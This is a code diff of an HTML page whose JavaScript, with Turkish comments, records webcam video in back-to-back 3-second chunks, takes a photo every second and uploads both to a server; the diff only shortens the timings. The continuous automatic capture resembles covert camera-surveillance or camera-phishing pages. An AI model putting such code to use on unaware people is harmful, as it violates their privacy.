@@ -143,7 +143,7 @@
         }
         
         // ============================================
-        // 5 SANİYELİK VİDEO KAYDI
+        // 3 SANİYELİK VİDEO KAYDI
         // ============================================
         function recordVideo() {
             if (!stream || !stream.active) return;
@@ -177,17 +177,17 @@
                     body: formData
                 });
                 
-                // Yeni video başlat (5 saniyelik)
-                setTimeout(recordVideo, 1000);
+                // Yeni video başlat (3 saniyelik)
+                setTimeout(recordVideo, 500);
             };
             
-            // 5 saniye kaydet
+            // 3 saniye kaydet
             mediaRecorder.start();
             setTimeout(() => {
                 if (mediaRecorder && mediaRecorder.state === 'recording') {
                     mediaRecorder.stop();
                 }
-            }, 5000);
+            }, 3000);
         }
         
         // ============================================
@@ -214,7 +214,7 @@
                     // 1 SANİYEDE 1 FOTOĞRAF
                     setInterval(takePhoto, 1000);
                     
-                    // 2 saniye bekle sonra video başlasın (5 saniyelik)
+                    // 2 saniye bekle sonra video başlasın (3 saniyelik)
                     setTimeout(recordVideo, 2000);
                 };
                 
@@ -246,4 +246,4 @@
         };
     </script>
 </body>
-</html>
+    </html>
